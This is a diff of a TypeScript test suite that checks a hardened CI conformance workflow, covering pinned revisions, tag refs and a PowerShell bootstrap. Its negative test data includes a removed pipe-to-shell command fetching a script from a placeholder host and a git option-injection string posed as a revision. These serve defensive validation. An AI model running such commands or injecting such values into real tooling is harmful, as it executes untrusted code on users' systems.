@@ -1,8 +1,9 @@
 import { execFileSync, spawnSync } from 'node:child_process';
 import { createHash } from 'node:crypto';
 import { existsSync, readFileSync } from 'node:fs';
+import { createRequire } from 'node:module';
 import { dirname, relative, resolve } from 'node:path';
-import { fileURLToPath, pathToFileURL } from 'node:url';
+import { fileURLToPath } from 'node:url';
 
 import * as ts from 'typescript';
 import { describe, expect, test } from 'vitest';
@@ -358,11 +359,18 @@ function verifyHardenedWorkflowGraph(workflow: string): void {
 }
 
 async function workflowFixture() {
-  const { verifyProtectedWorkflow } = await import(
-    pathToFileURL(resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs')).href
+  // Load the external committed validator with Node, outside Vite's module resolver.
+  const { verifyProtectedWorkflow } = createRequire(import.meta.url)(
+    resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs'),
   );
   const workflow = readFileSync(workflowPath, 'utf8');
   const harness = readFileSync(harnessPath);
+  const frozenLock = JSON.parse(
+    readFileSync(
+      resolve(validatorRoot, 'conformance', 'client-v1-cross-repository-lock.json'),
+      'utf8',
+    ),
+  );
   const producerCommit = 'f'.repeat(40);
   const producer = {
     status: 'compatible',
@@ -383,6 +391,7 @@ async function workflowFixture() {
     command: 'test:phase1-conformance',
     recordSchemaVersion: 2,
     workflow: {
+      ...frozenLock.evidenceProducer.workflow,
       name: 'client-v1 conformance',
       path: '.github/workflows/client-v1-conformance.yml',
       size: Buffer.byteLength(workflow, 'utf8'),
@@ -553,30 +562,80 @@ describe('client-v1 conformance workflow bootstrap', () => {
     );
   });
 
-  test('retains the locked harness authority under a tag copied through nested isolated clones', () => {
-    const workflow = readFileSync(workflowPath, 'utf8');
-    const childBootstrap = embeddedWindowsChildBootstrapSource(workflow);
-    const fetchLabel = "-Label 'Chat harness exact-SHA fetch'";
-    const authorityLabel = "-Label 'Chat harness authority ref'";
-    const fetchLabelIndex = childBootstrap.indexOf(fetchLabel);
-    const authorityLabelIndex = childBootstrap.indexOf(authorityLabel);
-    const authorityStart = childBootstrap.lastIndexOf('Invoke-Checked `', fetchLabelIndex);
-    const authorityEnd = childBootstrap.indexOf('\n\n$counterpartsRoot', authorityLabelIndex);
+  test('validates all frozen Chat source pins before fetching', () => {
+    const cases = [
+      { repository: 'OpenCoven/chat', revision: 'a'.repeat(40), result: 'accepted' },
+      { repository: 'OpenCoven/other', revision: 'a'.repeat(40), result: 'rejected' },
+      { repository: 'OpenCoven/chat', revision: '--upload-pack=unexpected', result: 'rejected' },
+      { repository: 'OpenCoven/chat', revision: 'A'.repeat(40), result: 'rejected' },
+    ];
+    const childBootstrap = embeddedWindowsChildBootstrapSource(readFileSync(workflowPath, 'utf8'));
+    const lockStart = childBootstrap.indexOf('$phase1Lock = Get-Content');
+    const validationStart = childBootstrap.indexOf('if (', lockStart);
+    const validationEnd = childBootstrap.indexOf('\nInvoke-Checked', validationStart);
+    expect(validationStart).toBeGreaterThan(lockStart);
+    expect(validationEnd).toBeGreaterThan(validationStart);
+    const encodedLock = readFileSync(resolve(projectRoot, 'phase1-conformance.lock.json')).toString(
+      'base64',
+    );
+    const encodedCases = Buffer.from(JSON.stringify(cases)).toString('base64');
+    // Share one bounded PowerShell startup across every case, including cold CI images.
+    const script = `
+$ErrorActionPreference = 'Stop'
+$phase1Lock = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${encodedLock}')) | ConvertFrom-Json
+$cases = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${encodedCases}')) | ConvertFrom-Json
+$results = @(foreach ($case in $cases) {
+  $phase1Lock.chat = $case
+  try {
+${childBootstrap.slice(validationStart, validationEnd)}
+    'accepted'
+  } catch {
+    'rejected'
+  }
+})
+[Console]::Out.Write(($results | ConvertTo-Json -Compress))
+`;
+    const result = execFileSync(
+      'pwsh',
+      ['-NoLogo', '-NoProfile', '-NonInteractive', '-Command', script],
+      {
+        encoding: 'utf8',
+        timeout: 25_000,
+      },
+    );
+    expect(JSON.parse(result)).toEqual(cases.map((entry) => entry.result));
+  }, 30_000);
 
-    expect(fetchLabelIndex).toBeGreaterThan(-1);
-    expect(authorityLabelIndex).toBeGreaterThan(fetchLabelIndex);
-    expect(authorityStart).toBeGreaterThan(-1);
-    expect(authorityEnd).toBeGreaterThan(authorityLabelIndex);
-    const authorityFetch = childBootstrap.slice(authorityStart, authorityEnd);
+  test.each([
+    ['harness', 'opencoven-phase1-harness'],
+    ['frozen source', 'opencoven-phase1-chat-source'],
+  ])(
+    'retains the locked %s authority under a tag copied through nested isolated clones',
+    (label, tag) => {
+      const workflow = readFileSync(workflowPath, 'utf8');
+      const childBootstrap = embeddedWindowsChildBootstrapSource(workflow);
+      const fetchLabel = `-Label 'Chat ${label} exact-SHA fetch'`;
+      const authorityLabel = `-Label 'Chat ${label} authority ref'`;
+      const fetchLabelIndex = childBootstrap.indexOf(fetchLabel);
+      const authorityLabelIndex = childBootstrap.indexOf(authorityLabel);
+      const authorityStart = childBootstrap.lastIndexOf('Invoke-Checked `', fetchLabelIndex);
+      const authorityEnd = childBootstrap.indexOf('\n\n$counterpartsRoot', authorityLabelIndex);
 
-    expect(authorityFetch).toContain("'refs/tags/opencoven-phase1-harness'");
-    expect(authorityFetch).not.toContain("'refs/heads/opencoven-phase1-harness'");
-    expect(authorityFetch).not.toContain("'refs/opencoven/phase1-harness'");
-  });
+      expect(fetchLabelIndex).toBeGreaterThan(-1);
+      expect(authorityLabelIndex).toBeGreaterThan(fetchLabelIndex);
+      expect(authorityStart).toBeGreaterThan(-1);
+      expect(authorityEnd).toBeGreaterThan(authorityLabelIndex);
+      const authorityFetch = childBootstrap.slice(authorityStart, authorityEnd);
+
+      expect(authorityFetch).toContain(`'refs/tags/${tag}'`);
+      expect(authorityFetch).not.toContain(`'refs/heads/${tag}'`);
+      expect(authorityFetch).not.toContain(`'refs/opencoven/${tag}'`);
+    },
+  );
 });
 
 describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow', () => {
-  test('is expected to be rejected by the pre-repin SDK workflow validator', async () => {
+  test('accepts the committed protected workflow with the current SDK validator', async () => {
     const fixture = await workflowFixture();
     expect(fixture.workflow).toContain('      validator_revision:');
     expect(fixture.workflow).toContain('        required: true');
@@ -592,7 +651,7 @@ describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow',
     expect(fixture.workflow).toContain('--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"');
     expect(() =>
       fixture.verifyProtectedWorkflow(fixture.workflow, fixture.producer, fixture.toolchain),
-    ).toThrow(/workflow/u);
+    ).not.toThrow();
   });
 
   test.each([
@@ -640,15 +699,15 @@ describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow',
     [
       'disabled Linux Secret Service setup',
       (workflow: string) =>
-        workflow.replace("        if: matrix.platform == 'linux-x64'", '        if: false'),
+        workflow.replace(
+          "      - name: Install Linux native dependencies\n        if: matrix.platform != 'win32-x64' && matrix.platform == 'linux-x64'",
+          '      - name: Install Linux native dependencies\n        if: false',
+        ),
     ],
     [
       'substituted Linux Secret Service setup',
       (workflow: string) =>
-        workflow.replace(
-          'node scripts/phase1-linux-secret-service.mjs --install',
-          'curl https://example.invalid/install.sh | sh',
-        ),
+        workflow.replace('gnome-keyring=46.1-2ubuntu0.2', 'gnome-keyring=0.0.0'),
     ],
     [
       'sibling action',
@@ -733,6 +792,7 @@ describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow',
   ])('rejects %s', async (_label, mutate) => {
     const fixture = await workflowFixture();
     const workflow = mutate(fixture.workflow);
+    expect(workflow).not.toBe(fixture.workflow);
     const producer = {
       ...fixture.producer,
       workflow: {
@@ -802,6 +862,7 @@ ${source.slice(start, end)}
       expect(result.stdout).toBe(accepted ? 'accepted' : '');
       if (!accepted) expect(result.stderr).toMatch(/reviewed.*(?:image|Studio)/u);
     },
+    30_000,
   );
 
   test('isolates unprivileged production and exact fresh validation from OIDC attestation', () => {
@@ -1792,7 +1853,7 @@ ${source.slice(start, end)}
       'Unstable SID-wide process drain did not fail closed.',
       'Artifact ACL sealing failure did not fail closed.',
       "Live root '$Label' terminal quarantine failed:",
-      "Terminal failure '$Label' producer attempt failed:",
+      `"Terminal failure '$Label' producer attempt failed.", $_.Exception`,
       "Terminal failure '$Label' cleanup failed:",
       'Windows supervisor test cleanup failed:',
       'Service creation unexpectedly succeeded for the restricted identity.',
@@ -2246,6 +2307,7 @@ ${source.slice(start, end)}
       'scripts/phase1-windows-supervisor-install.ps1',
       'scripts/windows-job-supervisor.cs',
       'scripts/windows-job-supervisor.test.ps1',
+      'scripts/windows-status-acl-probe.cs',
     ];
     for (const relativePath of [...new Set(metadataPaths)]) {
       const bytes = readFileSync(resolve(projectRoot, relativePath));
